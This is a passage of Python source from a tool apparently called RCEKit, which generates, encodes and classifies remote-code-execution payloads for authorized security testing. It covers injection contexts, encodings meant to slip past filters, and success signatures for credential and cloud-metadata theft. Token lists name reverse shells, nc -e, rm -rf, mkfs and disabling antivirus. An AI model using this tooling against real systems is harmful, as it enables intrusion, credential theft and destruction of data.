            "double_base64": lambda x: base64.b64encode(base64.b64encode(x.encode())).decode(),
        }
        # Bare encodings that need a decoder at the sink to ever execute. They are
        # excluded from the default set and flagged loudly for text output.
        self.decoder_required_encodings = {"base64", "hex", "base64_then_url", "double_base64"}
        # Default encodings emit only payloads that run as-is on the receiving
        # channel/sink (or carry their own decoder); decoder-required blobs above
        # must be requested explicitly with --encodings.
        self.default_encodings = ["none", "url_encode", "double_url_encode", "random_case", "base64_decode_exec"]

    def _load_template_payloads(self) -> None:
        """Load payload templates from a JSON file. Records the reason in
        ``self.template_error`` (``None`` on success) so callers can hard-fail
        on a missing or corrupt corpus instead of silently generating nothing.

        Resolution order: an explicit ``--template-file`` wins; otherwise
        ``templates/payloads.json`` beside the script wins; otherwise the corpus
        embedded in this file is used, so a lone ``rcekit.py`` still runs.

        Templates are JSON only: RCEKit is standard-library-only (no third-party
        dependencies), and a YAML parser is not in the stdlib."""
        self.template_error: Optional[str] = None
        if not self.template_path.exists():
            if not self.template_explicit:
                self._load_embedded_payloads()
                return
            message = f"template file not found: {self.template_path}"
            logger.warning("%s", message)
            self.payload_categories = {}
            self.detection_payloads = {}
            self.template_error = message
            return

        if self.template_path.suffix in {".yml", ".yaml"}:
            message = (f"YAML templates are not supported: {self.template_path}. RCEKit is "
                       "stdlib-only (no third-party dependencies); convert the template to JSON.")
            logger.error("%s", message)
            self.payload_categories = {}
            self.detection_payloads = {}
            self.template_error = message
            return

        try:
            with open(self.template_path, "r", encoding="utf-8") as template_file:
                data = json.loads(template_file.read())
            self.payload_categories = data.get("payload_categories", {})
            self.detection_payloads = data.get("detection_payloads", {})
            self.eval_carriers = data.get("eval_carriers", {})
            self.bridges = data.get("bridges", {})
            self.deser_probes = data.get("deser_probes", {})
        except Exception as exc:
            message = f"unable to parse {self.template_path}: {exc}"
            logger.error("%s", message)
            self.payload_categories = {}
            self.detection_payloads = {}
            self.template_error = message

    def _load_embedded_payloads(self) -> None:
        """Fall back to the corpus embedded in this file.

        Only reached when the default corpus file is absent — a lone rcekit.py on
        a jump box, an air-gapped copy, a bare ``curl`` of the raw script. A file
        that exists but fails to parse is still an error: falling back there would
        mask a truncated or tampered corpus, which is the case the hard-fail was
        written for.

        Parsed lazily so the in-repo path never pays for it."""
        self.corpus_source = ("built-in (embedded in rcekit.py)" if self.standalone_layout()
                              else "built-in (no templates/payloads.json beside the script)")
        try:
            data = json.loads(EMBEDDED_PAYLOAD_CORPUS)
            self.payload_categories = data.get("payload_categories", {})
            self.detection_payloads = data.get("detection_payloads", {})
            self.eval_carriers = data.get("eval_carriers", {})
            self.bridges = data.get("bridges", {})
            self.deser_probes = data.get("deser_probes", {})
        except Exception as exc:  # pragma: no cover — a build-time guarantee
            message = f"unable to parse the built-in payload corpus: {exc}"
            logger.error("%s", message)
            self.payload_categories = {}
            self.detection_payloads = {}
            self.template_error = message
            return
        # Debug, not info: on an installed run this is the normal path, and a
        # line on stdout every time would read as though something were wrong.
        # It still lands in rcekit.log, which is where a run gets reconstructed.
        logger.debug("using the built-in payload corpus (%s not found)", self.template_path)

    def uses_embedded_corpus(self) -> bool:
        """Whether the run fell back to the corpus embedded in this file."""
        return self.corpus_source.startswith("built-in")

    def standalone_layout(self) -> bool:
        """Whether this copy of rcekit.py ships without a corpus directory.

        The two ways to run RCEKit without ``templates/payloads.json`` are not
        the same event, and telling the operator so is the whole point of the
        distinction:

        * **No ``templates/`` directory at all** — an installed wheel, or a lone
          ``rcekit.py`` curled onto a jump box. The embedded corpus *is* the
          corpus here; there is nothing missing, so there is nothing to report.
        * **A ``templates/`` directory that exists without its corpus file** — a
          checkout where the file was deleted, moved or never generated. That is
          a real finding, and staying quiet about it would let someone believe
          they were running an edited corpus when they were not.

        Keyed on the directory rather than on ``__file__`` living in
        site-packages: an air-gapped copy of the single file has no site-packages
        and must still be treated as a first-class way to run."""
        return not self.template_path.parent.is_dir()

    def _corpus_stats(self) -> Tuple[int, int, Set[str]]:
        """Return (exploit payload count, environment count, environments)."""
        total = 0
        envs: Set[str] = set()
        for category in self.payload_categories.values():
            if not isinstance(category, dict):
                continue
            for env, payloads in category.items():
                envs.add(env)
                if isinstance(payloads, dict):
                    total += sum(len(items) for items in payloads.values())
                else:
                    total += len(payloads)
        return total, len(envs), envs

    def check_integrity(self) -> Tuple[bool, List[str]]:
        """Validate the loaded payload corpus for the ``--doctor`` health check.
        Returns ``(ok, report_lines)``."""
        report = [f"corpus: {self.corpus_source}"]
        if self.template_error:
            report.append(f"  [FAIL] {self.template_error}")
            return False, report
        report.append("  [ok] corpus loaded and parsed")
        total, env_count, _ = self._corpus_stats()
        detection_total = sum(len(v) for v in self.detection_payloads.values())
        report.append(f"  exploit categories: {len(self.payload_categories)}  "
                      f"payloads: {total}  environments: {env_count}")
        report.append(f"  detection environments: {len(self.detection_payloads)}  "
                      f"payloads: {detection_total}")
        ok = True
        if not self.payload_categories:
            report.append("  [warn] no exploit payload categories loaded")
        if not self.detection_payloads:
            report.append("  [warn] no detection payloads loaded")
        if not self.payload_categories and not self.detection_payloads:
            report.append("  [FAIL] corpus is empty")
            ok = False
        return ok, report

    def corpus_ready(self, mode: str) -> Tuple[bool, str]:
        """Whether the corpus can serve a run in ``mode`` ('detection' or
        'exploit'). Returns ``(ok, reason)``; used to hard-fail before a run
        would otherwise silently generate zero payloads."""
        if self.template_error:
            return False, self.template_error
        if mode == "detection":
            if not self.detection_payloads:
                return False, "no detection payloads loaded from the corpus"
        elif not self.payload_categories:
            return False, "no exploit payload categories loaded from the corpus"
        return True, ""

    def apply_watermark(self, payload: str, env: str, context_name: str, marker: str) -> str:
        """Embed a watermark comment or command into generated payloads where feasible."""
        watermark_token = f"RCEKit-ID:{marker}"

        if context_name == "attribute":
            logger.debug("Skipping watermark injection for attribute context due to quoting constraints.")
            return payload

        if env == "windows":
            return f"{payload} & REM {watermark_token}"
        if env in {"unix", "docker", "kubernetes"}:
            return f"{payload} ;# {watermark_token}"
        if env == "php":
            return f"{payload};/* {watermark_token} */"
        if env in {"python", "ruby", "perl"}:
            return f"{payload}  # {watermark_token}"
        if env == "nodejs":
            return f"{payload} // {watermark_token}"
        if env in {"java", "dotnet", "go"}:
            return f"{payload} /* {watermark_token} */"

        return f"{payload} /* {watermark_token} */"

    def _normalize_entry(self, entry: Any) -> Dict[str, Any]:
        if isinstance(entry, str):
            return {"payload": entry}
        if isinstance(entry, dict):
            return dict(entry)
        raise TypeError(f"Unsupported payload entry type: {type(entry)!r}")

    def _infer_runner(self, payload: str, env: str, sink: Optional[str]) -> Optional[str]:
        lower_payload = payload.lower()
        if "powershell" in lower_payload or "get-netipconfiguration" in lower_payload:
            return "powershell"

        runners = {
            "unix": "sh",
            "windows": "cmd",
            "nodejs": "node",
            "python": "python",
            "php": "php",
            "java": "java",
            "dotnet": "dotnet",
            "ruby": "ruby",
            "perl": "perl",
            "go": "go",
            "docker": "sh",
            "kubernetes": "kubectl",
            "sql": "sql",
            "graphql": "graphql",
            "mongodb": "mongo",
            "powershell": "powershell",
        }
        if sink and "ssti" in sink:
            return f"{env}_template"
        return runners.get(env)

    def _infer_expected_channel(self, payload: str, category_name: str, mode: str) -> str:
        lower_payload = payload.lower()
        if mode == "detection" and any(token in lower_payload for token in ["sleep", "timeout", "start-sleep"]):
            return "timing"
        if any(token in lower_payload for token in ["curl ", "wget ", "invoke-webrequest", "invoke-restmethod", "resolve-dnsname", "tcpclient"]):
            return "network"
        if any(token in lower_payload for token in ["console.error", "system.err", "error_log"]):
            return "stderr"
        if category_name in {"reverse_shells", "download_execute", "lateral_movement"}:
            return "network"
        return "response"

    def _infer_indicator(self, payload: str, category_name: str, env: str, mode: str) -> str:
        lower_payload = payload.lower()
        if mode == "detection":
            if any(token in lower_payload for token in ["{canary}", "detection_", "health_", "det:"]):
                return "Look for the generated canary token in the response body, stdout, stderr, or application logs."
            if any(token in lower_payload for token in ["sleep", "timeout", "start-sleep"]):
                return "Look for a reproducible response delay compared with baseline requests."
            if any(token in lower_payload for token in ["kubectl", "curl ", "wget ", "invoke-webrequest", "resolve-dnsname"]):
                return "Look for an authorized network, control-plane, or audit observable in your monitoring sink."
            return "Look for a benign execution marker in the response, logs, or telemetry pipeline."

        category_indicators = {
            "basic_enum": "Expect identity, host, process, or OS inventory data in the response or logs.",
            "file_operations": "Expect file content, directory listings, or permission errors that prove filesystem reachability.",
            "network_operations": "Expect network configuration data or an authorized outbound lookup in your monitoring sink.",
            "code_execution": "Expect proof that the runtime evaluated the snippet, such as command output or a rendered value.",
            "download_execute": "Expect an authorized outbound retrieval event or related telemetry in your monitoring sink.",
            "reverse_shells": "Expect an authorized out-of-band callback or connection attempt in your monitoring sink.",
            "credential_access": "Expect secret material, access-denied responses, or credential-store access telemetry.",
            "privilege_escalation": "Expect privilege inventory, group membership, capability listings, or access-denied signals.",
            "persistence": "Expect a durable artifact or configuration mutation only on an isolated lab target.",
            "cloud_metadata": "Expect metadata documents, cloud identity details, or blocked-access telemetry.",
            "database_enumeration": "Expect schema names, database inventory, or permission errors that confirm DB reachability.",
            "lateral_movement": "Expect an authorized remote-management event, connection attempt, or access-denied telemetry.",
            "container_escape": "Expect evidence of host boundary visibility, namespace access, or orchestrator privilege exposure.",
            "oob": "Expect an out-of-band DNS/HTTP callback to your collaborator/interactsh listener carrying the payload's unique token.",
            "waf_bypass": "Expect the same command output as the plain variant, proving the quote/space-free form slipped past input filtering.",
            "nosql_injection": "Expect authentication bypass, altered result sets, a reproducible delay from server-side JS, or a NoSQL/BSON error confirming operator injection.",
            "graphql_injection": "Expect introspection schema data, downstream command/SQL/NoSQL output reached through a resolver argument, or a GraphQL error revealing the injected value.",
        }
        return category_indicators.get(category_name, f"Expect a controlled {env} execution observable in the response or logs.")

    # Machine-readable success signatures: a regex that, if found in the target's
    # response, confirms the payload executed. Each entry maps command markers in
    # the payload to the regex that proves that command ran.
    _COMMAND_SIGNATURES = [
        (("/etc/passwd", "/etc/shadow", "awk -f:"), r"root:.*?:0:0:"),
        (("uname",), r"(Linux|Darwin|GNU|BSD)\b"),
        (("systeminfo", "cmd /c ver", " ver\n", "wmic os"), r"Microsoft Windows"),
        (("ipconfig",), r"(IPv4|Windows IP Configuration)"),
        (("ifconfig", "ip addr", "ip a\b", "ip -a"), r"(inet\s|ether\s|link/ether)"),
        (("sudo -l",), r"(may run|NOPASSWD|not allowed to run sudo)"),
        (("/etc/os-release", "lsb_release"), r"(PRETTY_NAME=|VERSION=|Distributor ID)"),
        (("printenv", "\benv\b", "set \n"), r"\bPATH="),
        (("7*7", "7 * 7"), r"(^|\D)49(\D|$)"),
        (("whoami /priv", "whoami /groups"), r"(Privilege|GROUP|SID)"),
        (("/proc/1/cgroup", "/proc/self/cgroup", "/proc/1/environ"), r"(cpuset|docker|kubepods|/init|HOSTNAME=)"),
        (("169.254.169.254", "computemetadata", "security-credentials", "latest/meta-data", "100.100.100.200"),
         r"(ami-|AccessKeyId|InstanceProfileArn|SecurityCredentials|\"Token\"|iam)"),
        (("__schema", "__typename", "__type("), r"(__schema|queryType|__typename|\"data\"\s*:)"),
        (("netstat", "ss -t", "ss -tunlp"), r"(LISTEN|ESTABLISHED|Proto)"),
    ]

    def _infer_command_match(self, payload: str, category_name: str) -> Optional[str]:
        """Return a response regex that confirms this payload executed, if known."""
        lower = payload.lower()
        for markers, regex in self._COMMAND_SIGNATURES:
            for marker in markers:
                token = marker.strip("\\b")
                if token and token.lower() in lower:
                    return regex
        # `id` / `id -u` produce a very recognisable uid=... line.
        if re.search(r"(^|[^\w.])id(\b|['\")])", payload) or "id -u" in lower:
            return r"uid=\d+"
        return None

    def _is_blocking(self, payload: str) -> bool:
        lower_payload = payload.lower()
        if any(token in lower_payload for token in
               ["tail -f", "start-sleep", "timeout /t", "readline()", "while(($i =", "select(undef"]):
            return True
        # Sleep family across languages: "sleep 5" (shell), time.sleep()/Thread.sleep()/
        # time.Sleep() (dot form), pg_sleep(), or a bare sleep( call. The old check only
        # matched "sleep " (with a space), so time.sleep(2) etc. were misclassified.
        if re.search(r"\bsleep\s", lower_payload):
            return True
        if re.search(r"(^|[^a-z0-9_])(pg_)?sleep\(", lower_payload) or ".sleep(" in lower_payload:
            return True
        return False

    def _expected_delay_ms(self, payload: str, environment: str) -> Optional[int]:
        """Best-effort parse of a blocking payload's intended delay, in
        milliseconds. The runtime disambiguates the seconds-vs-milliseconds
        sleep APIs (``time.sleep(2)`` is 2s in Python but ``Thread.sleep(2000)``
        is 2000ms in Java). Returns ``None`` when no delay can be determined, so
        the verifier falls back to its conservative fixed floor."""
        low = payload.lower()

        def sec(value: str) -> int:
            return int(round(float(value) * 1000))

        # Explicit, unambiguous units first.
        match = re.search(r"-milliseconds\s+([\d.]+)", low)
        if match:
            return int(round(float(match.group(1))))
        match = re.search(r"-seconds\s+([\d.]+)", low)
        if match:
            return sec(match.group(1))
        match = re.search(r"timeout\s+/t\s+([\d.]+)", low)
        if match:
            return sec(match.group(1))
        # Go: time.Sleep(N * time.Second|Millisecond).
        match = re.search(r"time\.sleep\(\s*([\d.]+)\s*\*\s*time\.(second|millisecond)", low)
        if match:
            return sec(match.group(1)) if match.group(2) == "second" else int(round(float(match.group(1))))
        # Perl: select(undef, undef, undef, N) -> seconds.
        match = re.search(r"select\(\s*undef\s*,\s*undef\s*,\s*undef\s*,\s*([\d.]+)", low)
        if match:
            return sec(match.group(1))
        # Java / .NET Thread.Sleep(N) -> milliseconds.
        if "thread.sleep(" in low:
            match = re.search(r"thread\.sleep\(\s*([\d.]+)", low)
            if match:
                return int(round(float(match.group(1))))
        # Node: setTimeout(cb, N) -> milliseconds.
        match = re.search(r"settimeout\([^,]*,\s*([\d.]+)\s*\)", low)
        if match:
            return int(round(float(match.group(1))))
        # SQL sleep helpers -> seconds.
        if environment in {"sql"}:
            match = re.search(r"(?:pg_sleep|sleep)\(\s*([\d.]+)", low)
            if match:
                return sec(match.group(1))
        # Python / Ruby sleep(N)/time.sleep(N) -> seconds.
        if environment in {"python", "ruby"}:
            match = re.search(r"sleep\(\s*([\d.]+)", low)
            if match:
                return sec(match.group(1))
        # Shell `sleep N` (seconds); also the generic fallback.
        match = re.search(r"\bsleep\s+([\d.]+)", low)
        if match:
            return sec(match.group(1))
        return None

    def _is_stateful(self, payload: str) -> bool:
        lower_payload = payload.lower()
        return any(
            token in lower_payload
            for token in [
                "crontab",
                "reg add",
                "schtasks",
                "new-itemproperty",
                "set-mppreference",
                "copy ",
                "chmod +x",
                "out-file",
                "kubectl run",
                "docker run",
                "tar -cf",
                ">>",
            ]
        )

    def _is_destructive(self, payload: str, category_name: str) -> bool:
        """Payloads that alter or damage the target (a stronger signal than
        `stateful`): persistence, backdoors, security-control tampering, and
        irreversible file/disk operations. Used to hold these back from live
        verification unless the operator explicitly opts in."""
        if category_name == "persistence" or self._is_stateful(payload):
            return True
        lower = payload.lower()
        return any(token in lower for token in [
            "rm -rf", "rm -f ", "mkfs", "dd if=", "del /f", "rmdir /s",
            "disablerealtimemonitoring", ":(){", "> /etc/", "shutdown", "reboot",
        ])

    def _classify_safety(self, payload: str, category_name: str, mode: str) -> str:
        lower_payload = payload.lower()
        if self._is_stateful(payload) or category_name == "persistence":
            return "stateful"
        if self._is_blocking(payload):
            return "intrusive"
        if any(token in lower_payload for token in ["curl ", "wget ", "invoke-webrequest", "invoke-restmethod", "ssh ", "scp ", "winrs ", "psexec", "kubectl ", "docker run", "nsenter", "tcpclient", "fsockopen"]):
            return "intrusive"
        if "{oob}" in payload or "jndi:" in lower_payload:
            return "intrusive"
        if mode == "detection":
            return "safe"
        if category_name in {"reverse_shells", "download_execute", "credential_access", "container_escape", "lateral_movement", "oob"}:
            return "intrusive"
        return "safe"

    def _lint_payload(self, payload: str, env: str) -> List[str]:
        lower_payload = payload.lower()
        notes: List[str] = []
        if env == "windows" and payload.strip() == "Get-NetIPConfiguration":
            notes.append("Requires a PowerShell execution surface rather than plain cmd.exe.")
        if env == "python" and "subprocess.call([" in payload and "shell=True" in payload:
            notes.append("Uses shell=True with a list argument; validate runtime semantics before relying on this variant.")
        if env == "java" and "command('bash'" in payload:
            notes.append("Contains Java-style code with single-quoted strings; validate syntax before operational use.")
        if env == "go" and "exec.command('" in lower_payload:
            notes.append("Contains Go-style code with single-quoted strings; validate syntax before operational use.")
        if "process.mainmodule" in lower_payload:
            notes.append("Relies on legacy Node.js process.mainModule behavior that may be absent in newer runtimes.")
        if "nc -e " in lower_payload:
            notes.append("Requires a netcat build that supports -e; many modern distributions disable this flag.")
        return notes

    def _requires_raw_context(self, env: str) -> bool:
        return env in {"python", "php", "java", "dotnet", "ruby", "perl", "go", "nodejs", "sql", "graphql", "mongodb"}

    def _is_context_compatible(self, context_name: str, env: str, raw_context_only: bool) -> bool:
        if context_name == "raw":
            return True
        # Serialization contexts wrap any environment's payload for the wire.
        if context_name in self.transport_contexts:
            return True
        # Shell-quoted break-outs only make sense for shell runners.
        if context_name in SELF_SEPARATING_CONTEXTS:
            return env in {"unix", "docker", "kubernetes"}
        if raw_context_only:
            if env == "php":
                return context_name == "php"
            if env == "nodejs":
                return context_name == "javascript"
            return False
        if env in {"unix", "windows", "docker", "kubernetes"}:
            return context_name in {"html", "attribute", "attribute_unquoted", "sql", "unix_shell", "windows_cmd", "powershell"}
        return False

    def _passes_filters(self, safety: str, blocking: bool, max_safety: str, include_blocking: bool) -> bool:
        normalized_max = max_safety if max_safety in SAFETY_ORDER else "intrusive"
        normalized_safety = safety if safety in SAFETY_ORDER else "intrusive"
        if SAFETY_ORDER[normalized_safety] > SAFETY_ORDER[normalized_max]:
            return False
        if blocking and not include_blocking:
            return False
        return True

    def _encoding_is_compatible(self, enc_name: str, runner: Optional[str]) -> bool:
        # random_case only survives where the target parser is case-insensitive
        # (Windows cmd, PowerShell, SQL keywords). Anywhere else it corrupts the
        # command (e.g. "id" -> "iD"), so suppress it rather than emit a payload
        # that silently fails for the operator.
        if enc_name == "random_case" and runner not in self.case_insensitive_runners:
            return False
        # The base64 decode-and-run harness assumes a POSIX shell interpreter.
        if enc_name == "base64_decode_exec" and runner != "sh":
            return False
        return True

    def _escape_for_context(self, payload: str, escape: str) -> str:
        """Make a payload valid inside its surrounding container.

        A break-out payload placed verbatim inside JSON/XML/YAML/etc. would
        corrupt the wire format; these rules encode the payload so it survives
        the serialization layer and reaches the sink intact.
        """
        if escape in {"json", "yaml", "graphql"}:
            # JSON string-body escaping (also valid for YAML double-quoted
            # scalars and GraphQL string literals): handles " \\ and controls.
            return json.dumps(payload)[1:-1]
        if escape == "xml":
            return (payload.replace("&", "&amp;").replace("<", "&lt;")
                    .replace(">", "&gt;").replace('"', "&quot;").replace("'", "&apos;"))
        if escape == "url":
            return urllib.parse.quote(payload)
        if escape == "header":
            # Keep the payload on a single header line unless the operator is
            # deliberately testing CRLF/header injection.
            return payload.replace("\r", " ").replace("\n", " ")
        return payload

    def _known_environments(self, mode: str) -> Set[str]:
        """Every environment name the corpus can actually yield in ``mode``."""
        if mode == "detection":
            return set(self.detection_payloads)
        known: Set[str] = set()
        for category in self.payload_categories.values():
            known.update(category)
        return known

    def _warn_unknown_selectors(self, mode: str,
                                selected_environments: Optional[List[str]],
                                selected_encodings: Optional[List[str]]) -> None:
        """Name any explicitly selected environment or encoding that matches
        nothing, once each.

        A selector that matches nothing produces an empty run, and an empty run
        is reported as a success -- so ``--environments linux`` (the corpus
        calls it ``unix``) is indistinguishable from a target for which there
        are simply no payloads. Unknown contexts and categories were already
        named; these two went by in silence. Only *explicit* selections are
        checked: the defaults are the corpus's own and must not warn."""
        if selected_environments:
            known = self._known_environments(mode)
            for env in dict.fromkeys(selected_environments):
                if env not in known:
                    logger.warning("Unknown environment: %s (known: %s)",
                                   env, ", ".join(sorted(known)))
        if selected_encodings:
            for enc in dict.fromkeys(selected_encodings):
                if enc not in self.encoding_methods:
                    logger.warning("Unknown encoding: %s (known: %s)",
                                   enc, ", ".join(sorted(self.encoding_methods)))

    def generate_payload_records(
        self,
        selected_contexts: Optional[List[str]] = None,
        selected_categories: Optional[List[str]] = None,
        selected_encodings: Optional[List[str]] = None,
        selected_environments: Optional[List[str]] = None,
        mode: str = "exploit",
        watermark_token: Optional[str] = None,
        max_safety: str = "intrusive",
        include_blocking: bool = False,
        oob_domain: Optional[str] = None,
    ) -> Iterator[PayloadRecord]:
        generated_payloads: Set[Tuple[str, str]] = set()
        contexts = selected_contexts if selected_contexts else list(self.default_contexts)
        encodings = selected_encodings if selected_encodings else (
            self.safe_detection_encodings if mode == "detection" else list(self.default_encodings)
        )
        self._warn_unknown_selectors(mode, selected_environments, selected_encodings)

        if mode == "detection":
            environments = selected_environments if selected_environments else list(self.detection_payloads.keys())
            for context_name in contexts:
                if context_name not in self.contexts:
                    logger.warning("Unknown context: %s", context_name)
                    continue
                for env in environments:
                    for entry in self.detection_payloads.get(env, []):
                        base = self._normalize_entry(entry)
                        # {canary}/{oob} stay as placeholders here and are given a
                        # fresh per-record correlation token in _encode_record_variants.
                        payload = str(base["payload"]).replace("{attacker_ip}", self.attacker_ip)
                        if "{oob}" in payload and not oob_domain:
                            continue
                        runner = base.get("runner") or self._infer_runner(payload, env, None)
                        blocking = bool(base.get("blocking", self._is_blocking(payload)))
                        safety = base.get("safety") or self._classify_safety(payload, "detection", "detection")
                        raw_context_only = bool(base.get("raw_context_only", self._requires_raw_context(env)))
                        if not self._passes_filters(safety, blocking, max_safety, include_blocking):
                            continue
                        if not self._is_context_compatible(context_name, env, raw_context_only):
                            continue
                        yield from self._encode_record_variants(
                            payload=payload,
                            context_name=context_name,
                            encodings=encodings,
                            generated_payloads=generated_payloads,
                            mode="detection",
                            category="detection",
                            environment=env,
                            sink=None,
                            indicator=base.get("indicator") or self._infer_indicator(payload, "detection", env, "detection"),
                            safety=safety,
                            expected_channel=base.get("expected_channel") or self._infer_expected_channel(payload, "detection", "detection"),
                            runner=runner,
                            tags=tuple(base.get("tags", ())),
                            notes=tuple([*base.get("notes", ()), *self._lint_payload(payload, env)]),
                            blocking=blocking,
                            stateful=bool(base.get("stateful", self._is_stateful(payload))),
                            oob_domain=oob_domain,
                            match_sig=base.get("match") or self._infer_command_match(payload, "detection"),
                        )
            return

        categories = selected_categories if selected_categories else list(self.payload_categories.keys())
        environments = selected_environments if selected_environments else [
            "unix",
            "windows",
            "nodejs",
            "python",
            "php",
            "java",
            "dotnet",
            "ruby",
            "perl",
            "go",
            "docker",
            "kubernetes",
            "graphql",
            "mongodb",
        ]

        for context_name in contexts:
            if context_name not in self.contexts:
                logger.warning("Unknown context: %s", context_name)
                continue
            for category_name in categories:
                category = self.payload_categories.get(category_name)
                if category is None:
                    logger.warning("Unknown category: %s", category_name)
                    continue
                for env in environments:
                    if env not in category:
                        continue
                    env_payloads = category[env]
                    if isinstance(env_payloads, dict):
                        for sink, payloads in env_payloads.items():
                            for entry in payloads:
                                yield from self._build_record_set(
                                    entry=entry,
                                    category_name=category_name,
                                    env=env,
                                    sink=sink,
                                    context_name=context_name,
                                    encodings=encodings,
                                    generated_payloads=generated_payloads,
                                    mode=mode,
                                    watermark_token=watermark_token,
                                    max_safety=max_safety,
                                    include_blocking=include_blocking,
                                    oob_domain=oob_domain,
                                )
                    else:
                        for entry in env_payloads:
                            yield from self._build_record_set(
                                entry=entry,
                                category_name=category_name,
                                env=env,
                                sink=None,
                                context_name=context_name,
                                encodings=encodings,
                                generated_payloads=generated_payloads,
                                mode=mode,
                                watermark_token=watermark_token,
                                max_safety=max_safety,
                                include_blocking=include_blocking,
                                oob_domain=oob_domain,
                            )

    def _build_record_set(
        self,
        entry: Any,
        category_name: str,
        env: str,
        sink: Optional[str],
        context_name: str,
        encodings: List[str],
        generated_payloads: Set[Tuple[str, str]],
        mode: str,
        watermark_token: Optional[str],
        max_safety: str,
        include_blocking: bool,
        oob_domain: Optional[str] = None,
    ) -> Iterator[PayloadRecord]:
        base = self._normalize_entry(entry)
        payload = str(base["payload"]).replace("{attacker_ip}", self.attacker_ip).replace("{attacker_domain}", self.attacker_domain)
        # OOB payloads only make sense with a collaborator domain to call back to.
        if "{oob}" in payload and not oob_domain:
            return
        runner = base.get("runner") or self._infer_runner(payload, env, sink)
        blocking = bool(base.get("blocking", self._is_blocking(payload)))
        safety = base.get("safety") or self._classify_safety(payload, category_name, mode)
        raw_context_only = bool(base.get("raw_context_only", self._requires_raw_context(env)))
        if not self._passes_filters(safety, blocking, max_safety, include_blocking):
            return
        if not self._is_context_compatible(context_name, env, raw_context_only):
            return

        notes = tuple([*base.get("notes", ()), *self._lint_payload(payload, env)])
        tags = tuple(dict.fromkeys([*base.get("tags", ()), category_name, *( [sink] if sink else [] )]))
        match_sig = base.get("match") or self._infer_command_match(payload, category_name)
        variants = [payload]
        # Shell-quoted break-out contexts already supply their own separator, so
        # prepending an env separator would produce ";;" style syntax errors.
        if env in self.separator_envs and context_name not in SELF_SEPARATING_CONTEXTS:
            variants = [f"{separator}{payload}" for separator in self.separators[env]]
            variants.append(payload)

        for variant in variants:
            final_payload = self.apply_watermark(variant, env, context_name, watermark_token) if watermark_token else variant
            yield from self._encode_record_variants(
                payload=final_payload,
                context_name=context_name,
                encodings=encodings,
                generated_payloads=generated_payloads,
                mode=mode,
                category=category_name,
                environment=env,
                sink=sink,
                indicator=base.get("indicator") or self._infer_indicator(payload, category_name, env, mode),
                safety=safety,
                expected_channel=base.get("expected_channel") or self._infer_expected_channel(payload, category_name, mode),
                runner=runner,
                tags=tags,
                notes=notes,
                blocking=blocking,
                stateful=bool(base.get("stateful", self._is_stateful(payload))),
                oob_domain=oob_domain,
                match_sig=match_sig,
            )

    def _encode_record_variants(
        self,
        payload: str,
        context_name: str,
        encodings: List[str],
        generated_payloads: Set[Tuple[str, str]],
        mode: str,
        category: str,
        environment: str,
        sink: Optional[str],
        indicator: str,
        safety: str,
        expected_channel: str,
        runner: Optional[str],
        tags: Tuple[str, ...],
        notes: Tuple[str, ...],
        blocking: bool,
        stateful: bool,
        oob_domain: Optional[str] = None,
        match_sig: Optional[str] = None,
    ) -> Iterator[PayloadRecord]:
        context = self.contexts[context_name]
        destructive = self._is_destructive(payload, category)
        expected_delay_ms = self._expected_delay_ms(payload, environment) if blocking else None
        for enc_name in encodings:
            if enc_name not in self.encoding_methods or not self._encoding_is_compatible(enc_name, runner):
                continue
            try:
                # Give each emitted variant its own correlation token so a received
                # callback or reflected canary maps back to exactly one payload.
                working = payload
                token: Optional[str] = None
                oob_host: Optional[str] = None
                math_match: Optional[str] = None
                exp_channel = expected_channel
                ind = indicator
                if "{oob}" in working and oob_domain:
                    token = self._generate_oob_token()
                    oob_host = f"{token}.{oob_domain}"
                    working = working.replace("{oob}", oob_host)
                    exp_channel = "interactsh"
                    ind = f"Look for an out-of-band DNS/HTTP callback to {oob_host} in your OOB listener."
                elif "{canary}" in working:
                    token = self._generate_canary()
                    working = working.replace("{canary}", token)
                elif "{math}" in working:
                    # Randomized arithmetic canary for template/expression sinks.
                    # A fixed 7*7=49 collides with any '49' already in the page
                    # (dates, counters, ids) and is reported inconclusive; a random
                    # 4-digit product is effectively unique, so its appearance is
                    # proof the engine evaluated the expression, not a coincidence.
                    a = random.randint(1000, 9999)
                    b = random.randint(1000, 9999)
                    working = working.replace("{math}", f"{a}*{b}")
                    math_match = rf"(^|\D){a * b}(\D|$)"

                # Decide separator-validity on the canonical payload, before any
                # encoding hides (or spuriously reveals) the leading separator.
                separator_led = self._is_separator_led(working, environment, context_name)

                encoded_payload = self.encoding_methods[enc_name](working)
                escape = context.get("escape", "none")
                escaped_payload = self._escape_for_context(encoded_payload, escape)
                wrapped_payload = f"{context['prefix']}{escaped_payload}{context['suffix']}"
                # Dedup per environment, not by payload text alone: a command
                # shared across environments (e.g. `whoami` on unix/docker/kube)
                # keeps a record — and its provenance — for each, instead of
                # collapsing to whichever environment happened to emit it first.
                # Identical text within one environment still collapses; text
                # outputs de-duplicate the lines again downstream.
                dedup_key = (environment, wrapped_payload)
                if dedup_key in generated_payloads:
                    continue
                generated_payloads.add(dedup_key)

                final_notes = list(notes)
                if enc_name not in {"none", "url_encode", "double_url_encode"}:
                    final_notes.append("This encoded variant requires a decode-and-execute path before the primary indicator is observable.")
                if escape != "none":
                    final_notes.append(f"Payload is escaped for the '{context_name}' serialization context; the sink must decode it before execution.")

                # Machine-readable success signature: a reflected canary token is
                # the exact confirmation string; OOB/timing use their own oracle;
                # otherwise fall back to the inferred command-output regex, which
                # matches the response regardless of how the payload was encoded.
                if exp_channel in {"interactsh", "timing"}:
                    match = None
                elif math_match is not None:
                    match = math_match
                elif token is not None:
                    match = re.escape(token)
                else:
                    match = match_sig

                yield PayloadRecord(
                    payload=wrapped_payload,
                    mode=mode,
                    category=category,
                    environment=environment,
                    context=context_name,
                    encoding=enc_name,
                    sink=sink,
                    indicator=ind,
                    safety=safety if safety in SAFETY_ORDER else "intrusive",
                    expected_channel=exp_channel,
                    runner=runner,
                    tags=tags,
                    notes=tuple(dict.fromkeys(final_notes)),
                    blocking=blocking,
                    stateful=stateful,
                    destructive=destructive,
                    separator_led=separator_led,
                    token=token,
                    oob_host=oob_host,
                    match=match,
                    expected_delay_ms=expected_delay_ms,
                )
            except Exception as exc:
                logger.error("Error encoding payload with %s: %s", enc_name, exc)

    def _generate_oob_token(self) -> str:
        return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(12))

    def _generate_canary(self) -> str:
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))

    def _is_separator_led(self, core: str, environment: str, context: str) -> bool:
        """True if this canonical (pre-encoding) payload can break out of a
        mid-command injection point.

        Judged on the raw payload rather than the final encoded/wrapped string:
